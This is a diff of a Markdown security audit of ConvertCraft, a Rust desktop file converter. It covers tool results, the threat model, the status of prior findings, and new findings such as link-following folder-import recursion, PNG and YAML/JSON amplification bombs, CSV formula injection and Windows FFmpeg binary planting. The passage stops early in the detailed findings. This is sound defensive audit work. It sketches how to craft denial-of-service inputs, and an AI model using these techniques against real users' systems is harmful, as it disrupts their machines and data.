@@ -1,664 +1,570 @@
-# ConvertCraft Rust security and correctness audit
+# ConvertCraft — Rust security and correctness audit
 
-**Date:** 2026-10-18. **Revision:** `41a79d1afd72542a5730990db144112b0690f1d9`.
+**Date:** 2026-10-21 · **Revision:** `dc73167` (`master`, clean tree) · **Scope:** the whole repository (one binary crate, 3 source files, 1,664 lines)
 
-> **Assumptions to correct:** ConvertCraft is an ordinary-user, local desktop converter, not a server or privileged service. Users may open malicious downloaded files or import attacker-controlled folders. Attackers can control those files' bytes, names, directory structure, and sometimes links or concurrent changes in shared source/output directories. The installed application, Rust toolchain, and normal executable search path are trusted. Filesystem permissions still apply. Protecting existing files, keeping the UI usable, and accurately reporting conversion failures are primary security properties. Exported CSV may subsequently be opened in a spreadsheet. These assumptions determine the severity ratings below.
+This was a read-only review. No source file, manifest, or lockfile was changed. This file replaces the earlier audit of revision `41a79d1` (2026-10-18), which is still in Git history. Section 3.4 records what happened to each of that audit's findings. Probes ran from an external harness in the session scratchpad that compiles the **unchanged** `src/output.rs` and `src/converter.rs` through `#[path]` (details in §3.3).
 
-Repository source, manifest, and lockfile were not modified. This report is the only added repository file. Additional probes and fixtures were created under `C:\Users\pierr\AppData\Local\Temp\opencode\convertcraft-audit`; Cargo also populated ignored build artifacts and its normal caches. The requested Markdown report was written directly; no document connector was available.
+---
 
 ## 1. Executive summary
 
-**Overall risk: Medium for a local desktop application handling untrusted files.** The principal confirmed problems concern data integrity and resource exhaustion. No first-party unsafe Rust, confirmed memory corruption, authentication bypass, shell command injection, or remote code execution was found. This is not a proof that the substantial native/third-party dependency surface is memory-safe.
+**Overall risk: Medium, almost entirely from availability problems.** There is no first-party `unsafe`, no shell, no network listener, and no credential handling. No memory-safety bug, remote code execution, or data-corruption path was found in first-party code. PR #11 (`src/output.rs`: staged, identity-checked, no-clobber publication) **fixes** the four data-integrity findings from the previous audit, and its 20 tests pass, including the real-symlink tests. What remains is mostly that a single hostile file or folder can freeze the UI, exhaust memory, or stop a batch.
 
-Highest-priority issues:
+Top issues:
 
-1. **The no-overwrite guarantee is not enforced when writing.** A file created after planning is overwritten; case-only output names collide on Windows even within one batch with overwriting disabled (CC-01).
-2. **Failed conversions destroy pre-existing outputs.** FFmpeg failure deletes the destination even when input parsing failed before output creation; JPEG encoding can truncate a destination before rejecting dimensions (CC-02).
-3. **Overwrite mode can overwrite another queued source, or the input through an alias.** Concurrent jobs can consequently read changed, partial, or invalid content (CC-03).
-4. **Small structured inputs can produce disproportionate memory/CPU consumption.** A 22,891-byte JSON probe produced 4,012,890 bytes of CSV; a 7,116-byte YAML alias probe produced 4,108,131 bytes of JSON (CC-05).
-5. **Folder import follows directory links recursively on the UI thread without visited-directory tracking or limits.** Cycles, repeated subtrees, large directories, and slow shares can stall import (CC-04).
+1. **F-01 (Medium, Confirmed).** Folder import follows directory links recursively **on the UI thread**, with no visited set and no budget. A folder holding one file plus two junctions pointing back at itself had not finished after 5 s. By then it had visited 1,853 directories and queued **the same file 1,789 times**. The traversal space is exponential, so the app freezes and has to be killed.
+2. **F-02 (Medium, Confirmed).** Image decompression amplification. A **260,811-byte PNG** (16384×16384 grayscale) drove one conversion to **1.35 GB peak working set** and wrote a **1 GiB BMP**. `image`'s 512 MiB decode limit doesn't help, because `to_rgba8()`/`to_rgb8()` allocate after decoding. Four workers run such jobs in parallel.
+3. **F-03 (Medium, Confirmed).** Structured-data amplification. Sparse JSON→CSV grows quadratically: 46,891 B became 16,026,890 B, with the whole output held in memory. A 7,116-byte YAML alias file became 4,108,131 bytes of JSON. There is no input-size or expansion budget.
+4. **F-04 (Low, mechanism Confirmed / Unix failure Plausible).** Every queued job holds **two OS handles** for the entire batch: 2,000 queued files raised the process handle count from 67 to 4,067. On Unix those are file descriptors, and the soft limit is commonly 1024 on Linux and 256 on macOS. Std does not raise it, so batches above roughly 100–500 files will fail with `EMFILE`.
+5. **F-05 / F-06 (Low).** CSV export emits spreadsheet formulas verbatim (documented, not mitigated). Separately, one missing, stale, or special-file row (for example a dangling `x.json` symlink inside an imported folder) fails the **whole** batch.
 
-Additional findings cover JPEG flush errors reported as success, spreadsheet formula injection, dependency health, and lossy data conversion.
+Tooling: `cargo check`, `clippy` (pedantic plus restriction lints), `cargo test` (20/20), and Miri on in-memory tests all pass. `cargo audit` fails: two `quick-xml 0.30.0` advisories, both on a Linux-only accessibility/proc-macro path, plus 9 "unmaintained" warnings including `unsafe-libyaml`, which is reached directly by YAML input. `cargo deny` fails because no `deny.toml` exists. `cargo geiger` cannot analyse this bin-only crate.
 
-The requested build and Clippy runs completed, and all four existing tests passed, including the installed FFmpeg integration test. `cargo audit` and `cargo deny check` failed. The two security advisories concern `quick-xml 0.30.0`; this version is absent from the Windows target dependency tree, and the inspected Linux dependency path parses build-time XML. A malicious conversion-file path into that XML parser was **not** established. Do not interpret the advisory severity as a demonstrated remotely exploitable application vulnerability.
+---
 
-## 2. Assumptions, architecture, and trust boundaries
+## 2. Assumptions (please correct)
 
-### Project and entry points
+**What it is.** ConvertCraft is a native desktop GUI (eframe/egui) batch converter. It converts **images** (decoded and encoded in-process by the `image` crate), **structured data** (JSON/YAML/TOML/CSV through a `serde_json::Value`), and **audio/video** (by spawning an external `ffmpeg` found on `PATH`). The README tells users to build from source with `cargo build --release --locked`; there are no binary releases. There is no library target, no CLI mode, no network listener, no plugins, no persisted settings, and no CI configuration in the repo.
 
-- One Rust 2024 binary crate, Cargo package `transmute 0.1.0`; no workspace members, library target, conversion CLI, HTTP listener, or application plugin interface. `Cargo.toml:1-14` declares eight direct dependencies. `Cargo.lock` is committed.
-- `src/main.rs:14-38`: loads an embedded logo, configures an eframe window, and constructs `App`.
-- File dialogs call `App::add_path` at `src/main.rs:198-205,285-287`; drag-and-drop reaches it at `src/main.rs:393-398`.
-- `App::start`, `src/main.rs:121-170`, plans paths and launches at most four worker threads. `src/main.rs:172-190` receives internal status messages.
-- `src/converter.rs:137-145` dispatches to image decoding/encoding, structured-data deserialization/serialization, or a locally installed FFmpeg process.
-- There are 881 lines in the two first-party Rust files, including tests. All were read.
+**Entry points.**
+- `src/main.rs:16` `main`: an embedded logo, then `App::new`, which **runs `ffmpeg -version` synchronously at startup** (`main.rs:92`).
+- Files and folders enter through the file dialogs (`main.rs:253, 258, 343`) and drag-and-drop (`main.rs:466-476`), both going to `App::add_path` (`main.rs:104`).
+- Convert (`main.rs:129` `App::start`) does `OutputPlanner::new` and `plan` on the UI thread, then hands off to up to 4 detached worker threads. Each worker runs `converter::convert` (`converter.rs:116`), then `StagedOutput::commit` (`output.rs:198`).
+- "Done" link: `reveal()` (`main.rs:512`) spawns `explorer` / `open` / `xdg-open`.
 
-### Trust boundaries
+**Trust boundaries.**
 
-1. **File bytes:** image decoders, `serde_json::from_str`, `serde_yaml::from_str`, `toml::from_str`, `csv::Reader`, and FFmpeg receive user-selected content. Extension checks classify inputs but do not establish that their contents are safe. Image format guessing can reach enabled formats beyond the advertised input extensions.
-2. **Filesystem names and topology:** file dialogs and dropped paths can designate local files, network shares, symbolic links, junctions, and changing directories. Source-relative output is the default. Planning uses lexical paths; writes later reopen those paths.
-3. **User settings:** output directory, target format, JPEG quality, and overwrite mode are UI-controlled. Targets come from fixed arrays (`src/converter.rs:34-40`); queue entries store `&'static str` targets (`src/main.rs:47-51`). No user-supplied configuration parser or persistent settings file was found.
-4. **Executable/environment boundary:** `Command::new("ffmpeg")` at `src/converter.rs:294` and platform file-manager commands at `src/main.rs:431-438` rely on the launch environment/executable search. FFmpeg availability is checked synchronously during `App::new` (`src/main.rs:84`). A hostile executable search path already crosses a code-execution trust boundary; simply selecting a media file does not change the process working directory or PATH.
-5. **OS/IPC/native code:** eframe, windowing, graphics, native dialogs, clipboard/accessibility dependencies, and FFmpeg interact with OS/native APIs. Linux dependencies include D-Bus/accessibility/portal integrations. These are dependency-level boundaries, not a first-party RPC service.
-6. **Exported data:** CSV bytes become input to spreadsheets or other downstream software. CSV escaping is not spreadsheet formula neutralization.
-7. **Build:** registry dependencies, their build scripts/procedural macros, the Rust toolchain, and Cargo's advisory/index services are trusted build-time inputs. An attacker who can alter source or the build environment is outside the ordinary malicious-file model.
+| Boundary | Attacker control | Reached code |
+|---|---|---|
+| File **contents** | Full | `image` decoders (format sniffed from content), `serde_json`, `serde_yaml` → `unsafe-libyaml`, `toml`, `csv`, FFmpeg demuxers/decoders |
+| File **names and topology** | Names, nesting, symlinks/junctions, special files, count | `add_path` traversal, `OutputPlanner` (`output.rs`), output naming (stem + fixed extension) |
+| Output directory | User-chosen; may be shared or writable by others | `output.rs` staging and publication |
+| Process environment | Trusted (PATH, application directory) | `Command::new("ffmpeg")`, `Command::new("explorer")` |
+| Downstream consumers | n/a: they consume our output | CSV opened in spreadsheets |
+| Build | Trusted (crates.io, lockfile committed) | 491 locked packages, build scripts, proc macros |
 
-### Threat model and exclusions
+**Threat model.** The attacker gets the user to import a file, archive, folder, or network share they control: "convert this for me". The attacker has no code execution on the machine and only the user's filesystem privileges. A stronger, rarer attacker can also write to the output directory or an ancestor of it while a conversion runs. The project documents that hostile output directories are out of scope (`docs/user-guide.md:40`, `docs/development.md:75`), and I treat them as out of scope too. Severity is judged for a single-user desktop app: hangs and out-of-memory errors are availability issues, not service-wide outages. Losing user data or modifying an input file would rank higher, and nothing like that remains.
 
-The principal attacker supplies an attractive file/folder and persuades the user to import or convert it. A stronger local/share attacker can change paths between planning and writing. Neither requires the application to expose a network server. Attacks have the user's filesystem privileges, not automatic administrator privileges.
-
-Normal overwrite permission is not treated as permission to corrupt another batch input or delete an old destination after an input-validation failure. Availability findings are rated for a desktop process, not a multi-tenant service. Spreadsheet behavior is an additional user interaction and depends on the spreadsheet application/settings.
-
-No first-party authentication, authorization database, cryptographic protocol, credential store, SQL execution, HTML template rendering, or TLS client configuration exists in the reviewed source. Their absence is not a negative finding. FFmpeg itself and external spreadsheet applications were not fully audited.
+---
 
 ## 3. Tooling results
 
-### Environment and reproducibility
+Host: Windows 11 x86_64-pc-windows-msvc · `rustc 1.97.1` / `cargo 1.97.1` · nightly `1.101.0` (Miri) · `cargo-audit 0.22.2` · `cargo-deny 0.20.2` · `cargo-geiger 0.14.0` · FFmpeg `2025-07-17-git-bc8d06d541` (gyan.dev essentials). Every tool was already installed, so nothing needed installing.
 
-- Host: Windows, `x86_64-pc-windows-msvc`.
-- Stable: `rustc 1.97.1 (8bab26f4f 2026-07-14)`, `cargo 1.97.1 (c980f4866 2026-06-30)`.
-- Nightly: `rustc 1.101.0-nightly (8006091eb 2026-10-17)`; Miri and rust-src were already installed.
-- Installed tools: `cargo-audit 0.22.2`, `cargo-deny 0.20.2`, `cargo-geiger 0.14.0`, Clippy, ripgrep. No missing tool required installation.
-- FFmpeg: `C:\Users\pierr\ffmpeg\bin\ffmpeg.exe`, `2025-07-17-git-bc8d06d541-essentials_build-www.gyan.dev`, libavformat `62.1.103`.
-- RustSec database: 1,338 advisories, revision `999ec89d5d3f10f20be14750ec8c2d8b44e0ac9b` after fetching during the audit.
-- The crate declares no own feature flags. `--all-features` does not mean every feature of every dependency or every platform was exercised.
+### 3.1 Requested commands
 
-### Requested commands
+| Command | Result | Notes |
+|---|---|---|
+| `cargo check --all-targets --all-features` | ✅ pass | — |
+| `cargo clippy --all-targets --all-features -- -W clippy::pedantic -W clippy::unwrap_used -W clippy::expect_used -W clippy::panic -W clippy::indexing_slicing -W clippy::arithmetic_side_effects` | ✅ pass, warnings | bin: 20 warnings; test target: 174 (mostly `unwrap` in tests). Triage below. |
+| `cargo test --all-features` | ✅ 20 passed / 0 failed | The FFmpeg tests really ran, because FFmpeg is installed. Symlink tests really ran (run with `--nocapture`, no skip diagnostic printed). |
+| `cargo audit` | ❌ exit 1 | 2 vulnerabilities (`quick-xml 0.30.0`: RUSTSEC-2026-0194, -0195), 9 unmaintained warnings. See F-11. |
+| `cargo deny check` | ❌ exit 5 | `advisories FAILED, bans ok, licenses FAILED, sources ok`. **No `deny.toml`**, so the default empty license allowlist produces 444 `rejected` errors. 42 duplicate-version warnings. No git sources. |
+| `cargo geiger` | ❌ exit 1 | Built everything, then failed with `Io(NotFound) "D:\Github\ConvertCraft\src\lib.rs"`: geiger expects a lib target. It also logged ~85 "Failed to match package" lines. It produced no counts. |
+| `rg '\bunsafe\b\|extern "C"\|repr(C)\|transmute\|from_raw_parts\|MaybeUninit\|impl (Send\|Sync)\|\*const\|\*mut\|impl Drop' src` | 0 matches | The first-party unsafe inventory is empty (§6). There is no `build.rs` and no `#![forbid(unsafe_code)]`. |
+| `cargo +nightly miri test jpeg_flush_error_is_returned` | ✅ 1 passed | In-memory JPEG encode through `image` + `BufWriter`. The other in-crate tests use the Windows filesystem, which Miri doesn't support here. |
+| `cargo +nightly miri test` (harness `miri_parsers`) | ✅ 2 passed | `serde_yaml` (anchors, aliases, undefined/cyclic alias, malformed input, duplicate keys, complex keys), `serde_json`, `toml`, `csv` inputs. No UB reported. This is a small sample, not proof. |
 
-| Command | Outcome | Interpretation |
-| --- | --- | --- |
-| `cargo check --all-targets --all-features` | Passed, exit 0; 6.78 s reported | Current Windows targets compile. |
-| `cargo clippy --all-targets --all-features -- -W clippy::pedantic -W clippy::unwrap_used -W clippy::expect_used -W clippy::panic -W clippy::indexing_slicing -W clippy::arithmetic_side_effects` | Passed with warnings, exit 0; 18.47 s | Binary: 21 warnings; test target: 42 warnings, 20 duplicates. These counts are not vulnerability counts. |
-| `cargo test --all-features` | Passed, exit 0 | 4 passed, 0 failed, 0 ignored; tests took 1.68 s after build. |
-| `cargo audit` | Failed, exit 1 | 2 vulnerabilities in one locked version of quick-xml; 9 allowed maintenance warnings. |
-| `cargo deny check` | Failed, exit 1 | `advisories FAILED, bans ok, licenses FAILED, sources ok`. No deny configuration was found; defaults were used. |
-| `cargo geiger` | Failed, exit 1 | Numerous package-matching errors, then failure removing `target\debug\deps\transmute-430326184fcb3cea.exe`. It ran alongside Cargo tests; a Windows artifact lock is consistent with this failure. No trustworthy aggregate unsafe count was produced. |
-| `rg --line-number '\bunsafe\b' src` | No matches, expected exit 1 | Complete textual first-party unsafe inventory: zero. Dedicated searches also found no FFI declarations/raw-pointer constructs/manual Send/Sync implementations. |
-| `cargo +nightly miri test --all-features converter::tests::data_round_trips` | Blocked, exit 1 | Miri isolation rejects `GetTempPathW` in the test fixture helper, before parser coverage. |
-| Same Miri command with `MIRIFLAGS=-Zmiri-disable-isolation` | Blocked, exit 1 | Windows `CreateDirectoryW` is unsupported by Miri. This is a tool/platform limitation, not detected UB. |
+**Clippy triage (bin target).** No warning points at an attacker-reachable panic:
+- `converter.rs:89` `cat.targets()[0]`: the arrays are constant and non-empty.
+- `main.rs:213, 216` `self.files[i]`: indices come from jobs built in `start()`, and every control that mutates `files` is disabled while `rx` is `Some`. Drag-and-drop is guarded by `!self.running()` (`main.rs:474`). The empty-state click (`main.rs:342`) can only show when `files` is empty, which can't happen while running.
+- `main.rs:193` `queue.lock().unwrap()`: the guard covers only `Vec::pop`, which can't panic, so the mutex can't be poisoned.
+- `main.rs:17` `expect` runs on compile-time embedded bytes.
+- `main.rs:125, 215` `+= 1` on `usize` counters can't realistically overflow. `main.rs:317` `usize as f32` affects only the progress display.
+- The rest are style: collapsible `if`, `for_each`, function length.
 
-The four existing tests are `output_paths_never_collide`, `data_round_trips`, `image_to_every_target`, and `media_via_ffmpeg`. FFmpeg was available and the media test ran through its conversion loop; it did not take its early-success skip branch (`src/converter.rs:415-418`). The path test does not cover aliases, output-creation races, or the inputs of other jobs.
+### 3.2 Dependency facts
 
-Clippy's security-relevant warnings were individually considered:
+- `quick-xml 0.30.0` comes in only through `zbus_xml ← zbus-lockstep(-macros) ← atspi-common ← accesskit_unix ← egui-winit ← eframe`, on Linux targets. `cargo tree -i quick-xml@0.30.0` without `--target all` prints nothing on Windows.
+- `unsafe-libyaml 0.2.11` (unmaintained) is the backend of `serde_yaml 0.9.34+deprecated`. It **directly parses attacker YAML** (`converter.rs:192`).
+- `image 0.25.10` is built with **default features**, which include `exr`, `hdr`, `dds`, `ff`, `pnm`, `avif`, and `rayon` (`image-0.25.10/Cargo.toml:73-93`). Combined with `with_guessed_format()`, decoders the UI never advertises become reachable (F-10).
 
-- `cat.targets()[0]` (`src/converter.rs:79`) is safe under the current nonempty fixed target arrays; no attacker can replace them.
-- `self.files[i]` (`src/main.rs:176,179`) receives indices generated internally. UI add/remove/clear controls and dropped-file ingestion are disabled while the channel exists; no index-forging path was found.
-- `queue.lock().unwrap()` (`src/main.rs:159`) does not hold the mutex during conversion. Queue popping itself has no input callback; no practical poison/deadlock trigger was established.
-- The embedded-logo `expect` (`src/main.rs:16`) uses compile-time bytes, not a selected file.
-- Progress division is guarded by `self.total > 0` (`src/main.rs:261-262`). Float precision warnings concern display accuracy; test-only `u32 as u8` casts create sample pixels.
-- The output suffix counter (`src/converter.rs:118,133`) is an inferred `i32`, theoretically overflowing after billions of occupied names. The practically reachable problem is an unbounded naming loop on the UI thread; integer overflow at that extreme was not promoted to a separate finding.
-- Test `unwrap`/`panic` calls and style warnings were not reported as vulnerabilities.
+### 3.3 Probe harness (external; repository untouched)
 
-### Dependency scan details
+`…\scratchpad\harness\` is a crate that copies the repo's `Cargo.lock` and includes the real modules:
 
-`cargo audit` reported:
-
-| Crate/version | Advisory | Kind / result |
-| --- | --- | --- |
-| `quick-xml 0.30.0` | [RUSTSEC-2026-0194](https://rustsec.org/advisories/RUSTSEC-2026-0194) | Quadratic duplicate-attribute checking; upstream CVSS 7.5; fixed in `>=0.41.0`. |
-| `quick-xml 0.30.0` | [RUSTSEC-2026-0195](https://rustsec.org/advisories/RUSTSEC-2026-0195) | Unbounded namespace declarations in NsReader; upstream CVSS 7.5; fixed in `>=0.41.0`. |
-| `paste 1.0.15` | RUSTSEC-2024-0436 | Unmaintained. |
-| `ttf-parser 0.25.1` | RUSTSEC-2026-0192 | Unmaintained. |
-| `unsafe-libyaml 0.2.11` | RUSTSEC-2024-0449 | Unmaintained; reached by the application's YAML parser. |
-| `zbus_names 3.0.0`, `4.3.4` | RUSTSEC-2026-0371 | Standalone crate unmaintained; functionality moved to zbus 6. |
-| `zvariant 4.2.0`, `5.15.0` | RUSTSEC-2026-0370 | Standalone crate unmaintained; functionality moved to successor packages. |
-| `zvariant_derive 4.2.0`, `5.15.0` | RUSTSEC-2026-0372 | Standalone crate unmaintained; macros moved to zbus 6. |
-
-`cargo deny` additionally emitted 443 license-rejection diagnostics because no license allowlist was configured, one unlicensed-root-package error, and 42 duplicate-version warnings. `Cargo.toml:1-4` has no license declaration. These are policy/metadata outcomes, not evidence that hundreds of dependencies have security vulnerabilities or legally incompatible licenses. No license was selected on the project's behalf.
-
-`cargo tree --locked --target all -i quick-xml` initially failed because the name is ambiguous (`0.30.0` and `0.41.0` are both locked). Retrying with `quick-xml@0.30.0` succeeded. The Windows-target inverse tree was empty; the all-target tree led through `zbus_xml -> zbus-lockstep[-macros] -> atspi-common -> accesskit_unix -> eframe`. See CC-08 for reachability.
-
-`cargo metadata --locked --offline --format-version 1` enumerated the root plus 490 registry packages, 87 packages declaring build-script targets, and 41 declaring proc-macro targets across the resolved graph. This is not a count of scripts executed on Windows. No git-source dependencies were found. A read-only check of the cached sparse registry index found entries for all 490 locked registry versions and **zero marked yanked**. This describes the fetched/local index snapshot, not future registry state.
-
-### Additional bounded probes
-
-An external Cargo harness used `#[path = "D:/Github/ConvertCraft/src/converter.rs"] mod converter;` to call the actual unchanged backend. It used a copied lockfile and matched direct dependencies. Commands had this form:
-
-```powershell
-cargo run --offline --manifest-path 'C:\Users\pierr\AppData\Local\Temp\opencode\convertcraft-audit\Cargo.toml' --target-dir 'D:\Github\ConvertCraft\target' --bin <probe>
+```rust
+#[path = "D:/Github/ConvertCraft/src/output.rs"]    mod output;
+#[path = "D:/Github/ConvertCraft/src/converter.rs"] mod converter;
+fn conv(input: &Path, dir: &Path, cat: Category, target: &str) -> anyhow::Result<PathBuf> {
+    let mut planner = OutputPlanner::new([input])?;
+    let plan = planner.plan(input, Some(dir), target, false)?;
+    converter::convert(input, plan, cat, target, &Options::default())
+}
 ```
 
-The initial backend probe binary was `convertcraft-audit-probe`; additional binaries were `path_alias`, `flush_probe`, and `failure_probe`. `flush_probe` substitutes a failing `Write` implementation for `File` to test the exact buffering/encoder composition; it is not an injected filesystem failure in the production process. Findings below include their relevant observations.
+It was built with `cargo build --release --offline`. Probe results are cited in each finding. For the folder-import probe, `App::add_path` lives in `main.rs` next to the GUI, so the probe uses a **verbatim replica** of its traversal with a counter and a 5 s cap added.
 
-To get useful Miri coverage without unsupported filesystem calls, an external in-memory test module exercised the **same serde_yaml-to-serde_json::Value boundary** as `src/converter.rs:196`, including serialization, valid aliases, malformed YAML, undefined aliases, cyclic aliases, and duplicate keys:
+### 3.4 Status of the previous audit's findings (rev `41a79d1`)
 
-```powershell
-cargo +nightly miri test --offline --manifest-path 'C:\Users\pierr\AppData\Local\Temp\opencode\convertcraft-audit\Cargo.toml' --target-dir 'D:\Github\ConvertCraft\target' --lib
-```
+| Prior ID | Topic | Status at `dc73167` | Evidence |
+|---|---|---|---|
+| CC-01 | No-overwrite not enforced at write time | **Fixed** | `persist_noclobber` when no destination existed at planning time (`output.rs:237-246`). Tests: `new_destination_after_planning_is_not_overwritten`, `independent_planners_cannot_publish_over_each_other`, `late_destination_symlink_does_not_modify_its_target`. |
+| CC-02 | Failed conversion deletes or truncates the old output | **Fixed** | All backends write to a staged temp file in the destination directory, published only after `sync_all` (`output.rs:154-202`). Tests: `failed_{jpeg,data,ffmpeg}_conversion_preserves_existing_output`. |
+| CC-03 | Outputs could alias other batch inputs | **Fixed** | `ProtectedInputs` uses case-folded canonical paths plus `same_file::Handle` identities (`output.rs:46-74, 104-117, 210-213`). Tests: cross-format, case-alias, hard-link, and symlinked-parent tests. |
+| CC-04 | Recursive link-following import on the UI thread | **Open** → F-01 | `main.rs:104-127` unchanged. Now reproduced. |
+| CC-05 | Unbounded structured-data expansion | **Open** → F-03; images split out as F-02 | `converter.rs:189, 252-289` unchanged. |
+| CC-06 | JPEG `BufWriter` flush error swallowed | **Fixed** | `encode_jpeg` flushes explicitly (`converter.rs:177-184`), every image path flushes (`:173`), and commit does `sync_all` (`output.rs:199-202`). Test: `jpeg_flush_error_is_returned` (also passes under Miri). |
+| CC-07 | CSV formula injection | **Open** → F-05 (re-rated Low; see rationale) | `converter.rs:276, 282`. |
+| CC-08 | quick-xml advisory / unmaintained YAML | **Open** → F-11 | Unchanged lockfile entries. |
+| MIN-01 | Duplicate keys and numeric inference | **Open** → M-1 | Re-verified. |
+| MIN-02 | Swallowed import errors; shared test fixtures | **Partly fixed** | Tests now use `tempfile::tempdir()`. Import errors are still swallowed (M-3). |
 
-Final result: **3 passed, 0 failed**, 2.52 s, with no Miri UB diagnostic. The first version of this external test incorrectly expected duplicate keys to be rejected; it failed on `{a: 1, a: 2}`. The corrected test verifies the observed last-value-wins behavior, and the malformed-input test separately covers actual errors. This did not require a repository change. A few successful inputs cannot establish the soundness of unsafe-libyaml or the entire dependency graph.
+**Residual risk in the fix (accepted and documented).** In replace mode, the identity check (`output.rs:220-228`) and `persist` (`:233`) are separate path operations, not a compare-and-swap. This is less dangerous than it looks: `rename` replaces a *directory entry* and never writes *through* a link. So even if an attacker swaps in a hard link or symlink to a protected source during that window, the source's **content** survives; only the planted name is replaced. Ancestor-directory swaps are acknowledged in `docs/development.md:75`. I found no remaining way to corrupt the content of any file other than the planned destination.
 
-A separate Python probe ran the application's FFmpeg argument pattern against locally generated media fixtures and a loopback-only HTTP server, with an 8-second child timeout. HLS text renamed to `.mp4` was rejected by this FFmpeg build's extension/MIME checks; a concat file referencing `../private.wav` was rejected as an unsafe filename. **Zero loopback HTTP requests occurred.** These probes did not establish SSRF or arbitrary file disclosure. Other FFmpeg versions/demuxers were not exhaustively tested.
-
-Raw command logs are retained by the harness under `C:\Users\pierr\.local\share\opencode\shell\e26ebfdb2c6dac4ea02396073cc47efe84c2f901\`. Key logs: `sh_14f27eb4b001l6EejyonmnkP62.out` (check), `sh_14f28065e001HgGs4Fe78vvL4R.out` (Clippy), `sh_14f280689001TTJNWgGNAihXpq.out` (tests), `sh_14f27eb60001mSJcj02sxaHE2n.out` (audit), `sh_14f27eb740016EMuqyWrjCAwD3.out` (deny), `sh_14f2806be001rjPyITgmmXstXu.out` (Geiger). Essential results are reproduced here so those local logs are not required to interpret the audit.
+---
 
 ## 4. Findings table
 
-Severity is contextual to the desktop threat model. **Confirmed** means the behavior follows directly from reviewed code and/or was reproduced; it does not mean every proposed impact was exercised. **Plausible** and **Needs verification** qualify individual consequences where indicated. No Critical or High finding was established under the baseline model.
+| ID | Severity | Category | Location | Summary | Status |
+|---|---|---|---|---|---|
+| F-01 | **Medium** | DoS / FS traversal | `src/main.rs:104-127` | Recursive, link-following, unbounded folder import on the UI thread; exponential with two self-links | Confirmed (replica probe) |
+| F-02 | **Medium** | DoS / decompression bomb | `src/converter.rs:138-142, 170, 180` | 260 KB PNG → 1.35 GB peak RSS + 1 GiB output; post-decode conversions bypass `image` limits; ×4 workers | Confirmed (probe) |
+| F-03 | **Medium** | DoS / amplification | `src/converter.rs:189, 192, 266-288` | Unbounded `read_to_string`; O(N²) sparse CSV header union and cells, all in memory; YAML alias expansion | Confirmed (probe) |
+| F-04 | Low | Resource exhaustion | `src/output.rs:20, 65-68, 92-93, 113-118`; `src/main.rs:143-172` | 2 OS handles held per queued job for the whole batch; `EMFILE` on Unix for moderately sized batches | Mechanism confirmed; Unix failure plausible |
+| F-05 | Low | Output injection | `src/converter.rs:276, 282` | Formula-leading header and cell values written verbatim to CSV | Confirmed (probe) |
+| F-06 | Low | Robustness / DoS | `src/output.rs:49-68`; `src/main.rs:130-142` | One missing, dangling-link, or special-file row fails the entire batch | Confirmed (probe) |
+| F-07 | Low | Concurrency / lifecycle | `src/main.rs:186-205, 222-224`; `src/converter.rs:371-376` | No panic isolation in workers; closing the app orphans FFmpeg children and staging directories | Confirmed (code); panic trigger not found |
+| F-08 | Low | External process boundary | `src/converter.rs:370-395` | FFmpeg: no deadline or cancel, unbounded stderr capture, no demuxer/protocol allowlist | Confirmed (code); inclusion attacks **failed** on tested build (Needs verification on others) |
+| F-09 | Low | Binary planting (Windows) | `src/converter.rs:293-310`; `src/main.rs:92, 514-516` | `ffmpeg` (auto-run at startup) and `explorer` resolve from the **application directory** before System32/PATH | Confirmed (std source); exploitation needs a file planted next to the exe |
+| F-10 | Low | Attack surface | `src/converter.rs:138-140`; `Cargo.toml:12` | Content sniffing plus default `image` features reach undeclared decoders (EXR, HDR, DDS, farbfeld) | Confirmed (probe) |
+| F-11 | Low | Dependencies / build policy | `Cargo.lock` (`quick-xml 0.30.0`, `unsafe-libyaml 0.2.11`); no `deny.toml`, no CI | Advisories (Linux-only path), unmaintained parser reached by input, no policy gate | Confirmed (tools); exploitability not established |
+| M-1…M-6 | Info | Minor | various | Data fidelity, `\\?\` paths given to Explorer, swallowed import errors, UI-thread blocking, identity on exotic file systems, post-planning source swap | see §5 Minor |
 
-| ID | Severity | Category | Location | Summary |
-| --- | --- | --- | --- | --- |
-| CC-01 | Medium | Filesystem / TOCTOU | `src/converter.rs:118-133,159,216,338`; `src/main.rs:132-140` | **Confirmed:** no-overwrite bypass and Windows case-alias output collisions. |
-| CC-02 | Medium | Data integrity / failure handling | `src/converter.rs:159-161,336-355` | **Confirmed:** a failed conversion can delete or truncate an existing destination. |
-| CC-03 | Medium | Batch correctness / file identity | `src/main.rs:122-140`; `src/converter.rs:125-128` | **Confirmed:** overwrite mode permits outputs to alias source files, including another queued input. |
-| CC-04 | Medium | Availability / filesystem traversal | `src/main.rs:96-108,198-205,393-398` | **Confirmed design flaw:** unbounded recursive link-following import executes on the UI thread. |
-| CC-05 | Medium | Availability / resource amplification | `src/converter.rs:192-216,220-233,265-288` | **Confirmed:** unrestricted materialization and quadratic sparse CSV expansion; YAML alias expansion. |
-| CC-06 | Medium | Error propagation / Drop | `src/converter.rs:159-161,187`; `src/main.rs:162-165` | **Confirmed mechanism:** JPEG buffered-write failures can be discarded while the UI reports success. |
-| CC-07 | Medium | Output injection | `src/converter.rs:275-286` | **Confirmed sink; conditional downstream impact:** CSV headers and string cells preserve spreadsheet formulas. |
-| CC-08 | Low | Dependencies / build | `Cargo.lock:2878-2885,3293-3302,3832-3835`; `Cargo.toml:9,13` | **Confirmed dependency debt:** vulnerable XML version and unmaintained parsers; application exploitability not established. |
-| MIN-01 | Low | Data fidelity | `src/converter.rs:195-196,226-230,236-251` | **Confirmed:** duplicate keys/headers silently collapse; large CSV integers can round through f64. |
-| MIN-02 | Info | Error reporting / test isolation | `src/main.rs:98-104`; `src/converter.rs:139,364-367` | **Confirmed:** import errors can disappear; predictable test fixture paths collide across runs. |
+---
 
 ## 5. Detailed findings
 
-Suggested diffs are **design sketches**, not applied patches. Helper functions named in sketches need implementations and tests; they are not assumed to exist. In particular, portable atomic replacement/no-clobber semantics must be designed for Windows and Unix rather than implemented with another `exists()` check.
+### F-01 — Folder import: unbounded, link-following recursion on the UI thread (Medium, Confirmed)
 
-### CC-01 — No-overwrite is a planning hint, not an enforced write policy
-
-**Severity:** Medium. **Status:** Confirmed. **Trigger:** output-name collisions or concurrent changes in a destination directory. Arbitrary-target damage through a replaced link is plausible where the attacker can manipulate that directory/link; that escalation was not exercised.
-
-**Evidence — `src/converter.rs:125-131`:**
+**Evidence** (`src/main.rs:104-117`):
 
 ```rust
-let candidate = dir.join(name);
-let taken = candidate == input
-    || reserved.contains(&candidate)
-    || (!overwrite && candidate.exists());
-if !taken {
-    reserved.insert(candidate.clone());
-    return candidate;
-}
-```
-
